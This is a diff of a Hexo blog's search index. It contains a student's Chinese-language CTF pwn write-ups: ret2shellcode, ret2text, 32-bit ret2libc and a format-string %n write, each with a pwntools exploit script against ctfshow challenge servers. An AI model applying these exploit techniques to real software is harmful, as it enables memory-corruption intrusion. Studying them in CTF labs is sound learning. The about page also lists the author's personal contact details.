@@ -141,7 +141,10 @@ ALSR技术
 在 Linux 系统中，栈随机化已经变成了标准行为。 它是更大的一类技术中的一种，这类技术称为地址空间布局随机化(Address-Space Layout Randomization), 或者简称 ASLR [99] 。采用 ASLR, 每次运行时程序的不同部分，包括程序代码、库代码、栈、 全局变最和堆数据，都会被加载到内存的不同区域。 这就意味着在一台机器上运行一个程序，与在其他机器上运行同样的程序，它们的地址映射大相径庭。这样才能够对抗一些形式的攻击
 
 以上出自《CSAPP》3.10.4 对抗缓冲区溢出攻击
-但是我们并非没有办法得到函数的真实地址，我们可以用基址和偏移去计算，有公式：
+在现代 Linux 系统中，ASLR 通常是全局开启的
+PIE保护和ASLR技术的关系如果程序没有开启 PIE，即使 ASLR 开启，攻击者仍然可以利用固定的代码地址来构造 ROP 链（因为代码基址不变）
+只有当 PIE 和 ASLR 同时开启时，一个进程的所有关键内存区域（代码、全局数据、栈、堆、动态链接库）的地址才会全部被随机化，使得攻击者难以预测任何地址
+以下的题目PIE保护全都是关的，所以正如上所说，我们可以用基址和偏移去计算，有公式：
 
 真实地址 &#x3D; 基址 + 偏移
 
@@ -197,6 +200,62 @@ ssize_t ctfshow()&#123;  char buf[112]; // [rsp+0h] [rbp-70h] BYREF  return read
       </categories>
       <tags>
         <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2shellcode刷题</title>
+    <url>/posts/1111.html</url>
+    <content><![CDATA[首先写在前面：所有题都是没有开NX保护的，我都checksec过了，就不再每一题都贴了
+ctfshow pwn60
+入门难度shellcode
+
+
+考点：strncpy函数
+
+int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;CTFshow-pwn can u pwn me here!!&quot;);  gets(s);  strncpy(buf2, s, 0x64u);  printf(&quot;See you ~&quot;);  return 0;&#125;
+
+关于strncpy函数的介绍：  https://www.runoob.com/cprogramming/c-function-strncpy.html
+
+
+from pwn import *context.log_level = &#x27;debug&#x27;context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28174)buf2 = 0x804A080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112,b&#x27;a&#x27;) + p32(buf2)io.sendline(payload)io.interactive()
+
+这里用的很妙的是ljust函数，因为shellcode也是有长度的，如果直接用+拼接，那么会超过偏移量，这里的意思是：不管 shellcode 实际有多长，ljust都能让总长度变成 112 字节。如果 shellcode 不够 112 字节，缺多少就在后面（右边）补多少个 a
+这样做到了一举两得，既填充了padding，又写入了shellcode
+ctfshow pwn61
+输出了什么？
+
+
+考点：recvuntil的分步使用
+
+int __cdecl main(int argc, const char **argv, const char **envp)&#123;  FILE *v3; // rdi  __int64 v5[2]; // [rsp+0h] [rbp-10h] BYREF  v5[0] = 0LL;  v5[1] = 0LL;  v3 = _bss_start;  setvbuf(_bss_start, 0LL, 1, 0LL);  logo(v3, 0LL);  puts(&quot;Welcome to CTFshow!&quot;);  printf(&quot;What&#x27;s this : [%p] ?\n&quot;, v5);  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);  gets(v5);  return 0;&#125;
+这个题的PIE保护是开的，因此我们每次输出的v5的地址在栈上都是随机的，我们需要接收这个地址，并且把shellcode写进去，但问题是%p周围有一堆提示，我们应该怎么只挑出%p打印的地址呢，这就需要用到recvuntil了
+recvuntil 的基本语法如下：tube.recvuntil(delimiters, drop=False, timeout=default)其中：tube: 是一个连接对象，通常是 pwnlib.tubes.remote (远程连接) 或 pwnlib.tubes.process (本地进程)delimiters: 必需。您期望接收数据直到遇到的那个终止字符串（或字节串），**必须是b&#x27;string&#x27;**drop: 可选。一个布尔值，默认为 False如果设置为 True，则接收到的数据将不包含这个终止字符串 (delimiters)如果设置为 False (默认)，则接收到的数据将包含这个终止字符串 (delimiters)timeout: 可选。设置等待数据的最大时间（秒）。如果超时，会抛出 pwnlib.timeout 异常
+
+我们可以通过用两次recvuntil”过滤”掉%p周围的字符，第一次recvuntil是接收[前的字符，第二次是接收]前的字符，我们用的时候就是第二次recvuntil的内容了
+io.recvuntil(&#x27;[&#x27;)v5_addr = int(io.recvuntil(&#x27;]&#x27;,drop=True))
+再说一下为什么要转成int类型，因为输出的地址，如0x7ffeebf02fb0，在python里是以字符串（bytes 类型）的形式存在的，我们需要转成16进制的地址
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2text小tips</title>
+    <url>/posts/1111.html</url>
+    <content><![CDATA[exp模板
+from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()
+
+264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址
+注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2text</tag>
       </tags>
   </entry>
   <entry>
@@ -256,96 +315,6 @@ ctfshow pwn53类canary爆破，先学学python再来
       </categories>
       <tags>
         <tag>ret2libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
-    <url>/posts/d4f00467.html</url>
-    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
-看一下左下角的时间，如果是now那就证明保存了
-另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
-最后，感谢我磊哥再一次救我
-]]></content>
-      <categories>
-        <category>碎碎念</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>初识32位下的ret2libc</title>
-    <url>/posts/b342ee9.html</url>
-    <content><![CDATA[从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。
-ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处
-egctfshow pwn入门39&amp;41这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh
-首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的
-
-
-from pwn import *context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)io = process(&quot;./pwn43&quot;)gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420           break *0x08048450&#x27;&#x27;&#x27;)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;A&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)payload += p32(buf2)payload += p32(buf2)io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()
-整个流程如下：
-1.函数返回，执行 ret → 跳到 gets
-2.gets(buf2) 读取我们下一次 sendline 的 “&#x2F;bin&#x2F;sh”
-3.gets 执行完后 ret → 跳到 system
-4.system(buf2) → 执行 &#x2F;bin&#x2F;sh，获得 shell
-让chatgpt帮忙画了一个栈图
-
-
-
-地址
-内容
-含义
-
-
-
-ESP+12
-buf2
-system(“&#x2F;bin&#x2F;sh”) 参数
-
-
-ESP+8
-buf2
-gets(buf2) 参数
-
-
-ESP+4
-system
-gets 返回后跳到这里
-
-
-ESP
-gets
-ret → gets
-
-
-
-（低地址）
-
-
-
-要特别注意的是，我们的payload并不直接执行压栈操作，而是覆盖内存，因此此我们不能用简单的先进后出来解释payload的顺序。我们必须知道，内存的写入方向是从低地址向高地址，虽然内存增长和栈增长没有必然关系，但是我们直观上可以理解为两者的方向是相反的
-在溢出中，我们只能覆盖返回地址,不能直接移动ESP。ret指令会自动让ESP上移到返回地址的位置，并读取该地址。因此，我们把gets写到返回地址处，而不是尝试让ESP指向gets
-
-
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>ret2libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ret2text小tips</title>
-    <url>/posts/1111.html</url>
-    <content><![CDATA[exp模板
-from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()
-
-264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址
-注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>ret2text</tag>
       </tags>
   </entry>
   <entry>
@@ -443,7 +412,7 @@ from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;pwn.chal
       </tags>
   </entry>
   <entry>
-    <title>初识ROP</title>
+    <title>初识ROP和ret2shellcode</title>
     <url>/posts/2b89d936.html</url>
     <content><![CDATA[如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。
 何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。
@@ -480,6 +449,18 @@ context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = r
       <tags>
         <tag>ret2libc</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
+    <url>/posts/d4f00467.html</url>
+    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
+看一下左下角的时间，如果是now那就证明保存了
+另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
+最后，感谢我磊哥再一次救我
+]]></content>
+      <categories>
+        <category>碎碎念</category>
+      </categories>
   </entry>
   <entry>
     <title>初识格式化字符串（上）</title>
@@ -528,76 +509,6 @@ eg1：newstar2025 week2 刻在栈上的秘密
       </tags>
   </entry>
   <entry>
-    <title>用gdb的动态视角看ret2text的实现</title>
-    <url>/posts/2ee84d32.html</url>
-    <content><![CDATA[来看一道非常简单的栈溢出
-
-后门函数地址ida里很明显，0x8048521
-exp本身不难写,下面看一下怎么用gdb确定偏移
-from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);gdb.attach(io,&quot;b main&quot;) #在main函数下断点payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)io.sendline(payload)io.interactive()
-
-
-
-0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）
-用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量
-我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址
-
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>ret2text</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初识格式化字符串（下）</title>
-    <url>/posts/7e846c6a.html</url>
-    <content><![CDATA[在上一篇文章中，我们了解了如何利用格式化字符串漏洞实现任意读,主要靠%d，%s等格式化占位符泄露内存。接下来介绍一下如何实现任意写，即覆盖内存
-开挂的%n%n是一个很牛的格式化占位符，和%d，%s等占位符不一样,它不输出字符，而是把已经成功输出的字符个数写入对应的整型指针参数所指的变量
-换句话说，它会将已打印的字符个数输出至格式化参数对应的地址中
-
-printf(“包含%n的格式字符串”, …, &amp;变量名);
-
-比较特殊的是，%n对应的参数必须是一个指向整数的指针
-#include &lt;stdio.h&gt;int main() &#123;    int count;    printf(&quot;Hello, world!%n\n&quot;, &amp;count);    printf(&quot;上面那行输出了 %d 个字符。\n&quot;, count);    return 0;&#125;
-
-输出结果是：Hello, world!上面那行输出了 13 个字符。
-也就是说%n统计了前面字符串的字符数，并且让count&#x3D;1
-利用%n覆盖内存实战主要分以下三个步骤：1.确定覆盖地址2.确定相对偏移3.进行覆盖  
-eg2.ctfshow pwn入门91
-logo函数打印了一些欢迎词，不用管。然后是ctfshow函数，下面判断了daniu的值是否等于6，如果是，那么我们就能执行system&#x2F;bin&#x2F;sh。  
-我们进ctfshow函数看一下
-
-首先定义了一个大小为80的数组（缓冲区）s，memset清空重置了s的内容，有一个read函数可以往s里读入数据。重点是下面的printf函数，明显是存在格式化字符串漏洞的，再下面的printf函数可以打印出目前daniu的值
-
-我们看一下daniu，这里的？就说明其初始值为0，而位于.bss段则是可读可写的
-下面我们的目的就是将daniu的值覆盖为6，覆盖地址确定了，下面我们来求偏移量。什么是偏移量，就是我们利用格式化字符串漏洞写入数据时，我们并不知道是从printf的第几个参数开始写的，我们这里要找到我们是从第几个参数
-有以下两种方法
-手测
-aaaa在16进制里是0x61616161，从aaaa往后数的第7个地址是0x61616161，证明我们可以在第7个参数往后读
-这种方法比较无脑，但是存在一个问题是如果限制我们输入%p的数量，那就不好找偏移量了。于是就有了我们的第二个方法
-指令在pwndbg里有一个叫fmtarg的插件，可以自动帮我们计算偏移量，但是我的虚拟机里没有装这个插件，所以就不演示了，而且我个人更喜欢手测，所以如果以后遇到这种特殊情况再说
-有了覆盖地址和偏移量，我们就可以进行覆盖了
-from pwn import *io = remote (&#x27;pwn.challenge.ctf.show&#x27;,28271)#offset = 7daniu_addr = 0x0804B038payload = p32(daniu_addr) + b&#x27;aa%7$n&#x27;io.sendline(payload)io.interactive()
-
-我们来逐步理解一下这段payload前面我们提到，%n对应的参数必须是一个指向整数的指针,也就是必须是一个地址
-我们前面已经测试过了，如果我们要通过read去写入字符串，是从栈上的第七个参数开始的写，因此，我们是通过read函数，daniu_addr写到了栈上的第七个参数上
-然后到了第一个printf函数上，printf的第一个参数是s的第一个参数，也就是我们通过read传入的格式化字符串”\x38\xb0\x04\x08 a a %7$n”，我们需要利用的是printf函数里的%7$n这个特性，
-我们可以将%7$n理解为连续7个%n，但是最终起作用的是第7个%n，很显然%7$n需要找printf的第七个参数的地址，这个时候就必须去栈里寻找，前六个参数都是我们之前说的”奇怪的数”，也就是随机从栈上或者寄存器里取的，但是到了栈空间上第七个参数的位置就不一样了，我们通过read函数将daniu_addr写进了栈空间上的第七个参数，那么%7$n就非常开心了，他就会将目标地址锁定为daniu_addr
-让我们把视角拉回printf函数，%7$n前有几个字符呢，我们将daniu_addr打包成了4个字符，加上我们手动输入的两个字符的aa，这一共是6个字符，于是printf函数开始的%7$n开始发力了，它统计到它之前有6个字符，并将数值6赋给了它指向地址对应的参数，也就是让daniu&#x3D;6
-特别容易混淆的是printf的参数和寄存器上的参数，他俩并不是一回事，一定要区分好。printf的一参永远是格式化字符串，read读进去的位置是寄存器的第x个参数的地址，是%x$n所取的地址，这里的x就是我们算的偏移量。
-最后我们通过输出也可以看到daniu的值被改成了6
-总结格式化字符串漏洞存在的标志比较明显，目前我们初步认识了如何利用%d，%s等读，利用%n写。下一步，格式化字符串还会发挥出什么奇效呢，让我们拭目以待
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>格式化字符串</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>梦开始的地方</title>
     <url>/posts/1234.html</url>
     <content><![CDATA[我的博客搭建终于好了！
@@ -606,6 +517,68 @@ from pwn import *io = remote (&#x27;pwn.challenge.ctf.show&#x27;,28271)#offset =
       <categories>
         <category>碎碎念</category>
       </categories>
+  </entry>
+  <entry>
+    <title>初识32位下的ret2libc</title>
+    <url>/posts/b342ee9.html</url>
+    <content><![CDATA[从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。
+ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处
+egctfshow pwn入门39&amp;41这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh
+首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的
+
+
+from pwn import *context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)io = process(&quot;./pwn43&quot;)gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420           break *0x08048450&#x27;&#x27;&#x27;)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;A&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)payload += p32(buf2)payload += p32(buf2)io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()
+整个流程如下：
+1.函数返回，执行 ret → 跳到 gets
+2.gets(buf2) 读取我们下一次 sendline 的 “&#x2F;bin&#x2F;sh”
+3.gets 执行完后 ret → 跳到 system
+4.system(buf2) → 执行 &#x2F;bin&#x2F;sh，获得 shell
+让chatgpt帮忙画了一个栈图
+
+
+
+地址
+内容
+含义
+
+
+
+ESP+12
+buf2
+system(“&#x2F;bin&#x2F;sh”) 参数
+
+
+ESP+8
+buf2
+gets(buf2) 参数
+
+
+ESP+4
+system
+gets 返回后跳到这里
+
+
+ESP
+gets
+ret → gets
+
+
+
+（低地址）
+
+
+
+要特别注意的是，我们的payload并不直接执行压栈操作，而是覆盖内存，因此此我们不能用简单的先进后出来解释payload的顺序。我们必须知道，内存的写入方向是从低地址向高地址，虽然内存增长和栈增长没有必然关系，但是我们直观上可以理解为两者的方向是相反的
+在溢出中，我们只能覆盖返回地址,不能直接移动ESP。ret指令会自动让ESP上移到返回地址的位置，并读取该地址。因此，我们把gets写到返回地址处，而不是尝试让ESP指向gets
+
+
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2libc</tag>
+      </tags>
   </entry>
   <entry>
     <title>初识ret2syscall</title>
@@ -661,13 +634,83 @@ from pwn import * context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_lev
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
+    <title>初识格式化字符串（下）</title>
+    <url>/posts/7e846c6a.html</url>
+    <content><![CDATA[在上一篇文章中，我们了解了如何利用格式化字符串漏洞实现任意读,主要靠%d，%s等格式化占位符泄露内存。接下来介绍一下如何实现任意写，即覆盖内存
+开挂的%n%n是一个很牛的格式化占位符，和%d，%s等占位符不一样,它不输出字符，而是把已经成功输出的字符个数写入对应的整型指针参数所指的变量
+换句话说，它会将已打印的字符个数输出至格式化参数对应的地址中
+
+printf(“包含%n的格式字符串”, …, &amp;变量名);
+
+比较特殊的是，%n对应的参数必须是一个指向整数的指针
+#include &lt;stdio.h&gt;int main() &#123;    int count;    printf(&quot;Hello, world!%n\n&quot;, &amp;count);    printf(&quot;上面那行输出了 %d 个字符。\n&quot;, count);    return 0;&#125;
+
+输出结果是：Hello, world!上面那行输出了 13 个字符。
+也就是说%n统计了前面字符串的字符数，并且让count&#x3D;1
+利用%n覆盖内存实战主要分以下三个步骤：1.确定覆盖地址2.确定相对偏移3.进行覆盖  
+eg2.ctfshow pwn入门91
+logo函数打印了一些欢迎词，不用管。然后是ctfshow函数，下面判断了daniu的值是否等于6，如果是，那么我们就能执行system&#x2F;bin&#x2F;sh。  
+我们进ctfshow函数看一下
+
+首先定义了一个大小为80的数组（缓冲区）s，memset清空重置了s的内容，有一个read函数可以往s里读入数据。重点是下面的printf函数，明显是存在格式化字符串漏洞的，再下面的printf函数可以打印出目前daniu的值
+
+我们看一下daniu，这里的？就说明其初始值为0，而位于.bss段则是可读可写的
+下面我们的目的就是将daniu的值覆盖为6，覆盖地址确定了，下面我们来求偏移量。什么是偏移量，就是我们利用格式化字符串漏洞写入数据时，我们并不知道是从printf的第几个参数开始写的，我们这里要找到我们是从第几个参数
+有以下两种方法
+手测
+aaaa在16进制里是0x61616161，从aaaa往后数的第7个地址是0x61616161，证明我们可以在第7个参数往后读
+这种方法比较无脑，但是存在一个问题是如果限制我们输入%p的数量，那就不好找偏移量了。于是就有了我们的第二个方法
+指令在pwndbg里有一个叫fmtarg的插件，可以自动帮我们计算偏移量，但是我的虚拟机里没有装这个插件，所以就不演示了，而且我个人更喜欢手测，所以如果以后遇到这种特殊情况再说
+有了覆盖地址和偏移量，我们就可以进行覆盖了
+from pwn import *io = remote (&#x27;pwn.challenge.ctf.show&#x27;,28271)#offset = 7daniu_addr = 0x0804B038payload = p32(daniu_addr) + b&#x27;aa%7$n&#x27;io.sendline(payload)io.interactive()
+
+我们来逐步理解一下这段payload前面我们提到，%n对应的参数必须是一个指向整数的指针,也就是必须是一个地址
+我们前面已经测试过了，如果我们要通过read去写入字符串，是从栈上的第七个参数开始的写，因此，我们是通过read函数，daniu_addr写到了栈上的第七个参数上
+然后到了第一个printf函数上，printf的第一个参数是s的第一个参数，也就是我们通过read传入的格式化字符串”\x38\xb0\x04\x08 a a %7$n”，我们需要利用的是printf函数里的%7$n这个特性，
+我们可以将%7$n理解为连续7个%n，但是最终起作用的是第7个%n，很显然%7$n需要找printf的第七个参数的地址，这个时候就必须去栈里寻找，前六个参数都是我们之前说的”奇怪的数”，也就是随机从栈上或者寄存器里取的，但是到了栈空间上第七个参数的位置就不一样了，我们通过read函数将daniu_addr写进了栈空间上的第七个参数，那么%7$n就非常开心了，他就会将目标地址锁定为daniu_addr
+让我们把视角拉回printf函数，%7$n前有几个字符呢，我们将daniu_addr打包成了4个字符，加上我们手动输入的两个字符的aa，这一共是6个字符，于是printf函数开始的%7$n开始发力了，它统计到它之前有6个字符，并将数值6赋给了它指向地址对应的参数，也就是让daniu&#x3D;6
+特别容易混淆的是printf的参数和寄存器上的参数，他俩并不是一回事，一定要区分好。printf的一参永远是格式化字符串，read读进去的位置是寄存器的第x个参数的地址，是%x$n所取的地址，这里的x就是我们算的偏移量。
+最后我们通过输出也可以看到daniu的值被改成了6
+总结格式化字符串漏洞存在的标志比较明显，目前我们初步认识了如何利用%d，%s等读，利用%n写。下一步，格式化字符串还会发挥出什么奇效呢，让我们拭目以待
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>格式化字符串</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>用gdb的动态视角看ret2text的实现</title>
+    <url>/posts/2ee84d32.html</url>
+    <content><![CDATA[来看一道非常简单的栈溢出
+
+后门函数地址ida里很明显，0x8048521
+exp本身不难写,下面看一下怎么用gdb确定偏移
+from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);gdb.attach(io,&quot;b main&quot;) #在main函数下断点payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)io.sendline(payload)io.interactive()
+
+
+
+0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）
+用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量
+我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址
+
+]]></content>
+      <categories>
+        <category>pwn入门</category>
+      </categories>
+      <tags>
+        <tag>ret2text</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>标签</title>
+    <url>/tags/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>分类</title>
-    <url>/archive/index.html</url>
+    <title></title>
+    <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -676,9 +719,19 @@ from pwn import * context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_lev
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>标签</title>
-    <url>/tags/index.html</url>
+    <title>分类</title>
+    <url>/archive/index.html</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/about/index.html</url>
+    <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn
+
+兴趣爱好足球 主队是山东泰山和曼城板绘 爱画一些二次元妹子，但实际上是个现充在看的书 《深入理解计算机系统（CSAPP）》
+
+联系我QQ 1935572185163邮箱 lzr20061008@163.com
+]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1128,16 +1181,6 @@ div#category {
 
 
 
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/about/index.html</url>
-    <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn
-
-兴趣爱好足球 主队是山东泰山和曼城板绘 爱画一些二次元妹子，但实际上是个现充在看的书 《深入理解计算机系统（CSAPP）》
-
-联系我QQ 1935572185163邮箱 lzr20061008@163.com
 ]]></content>
   </entry>
 </search>
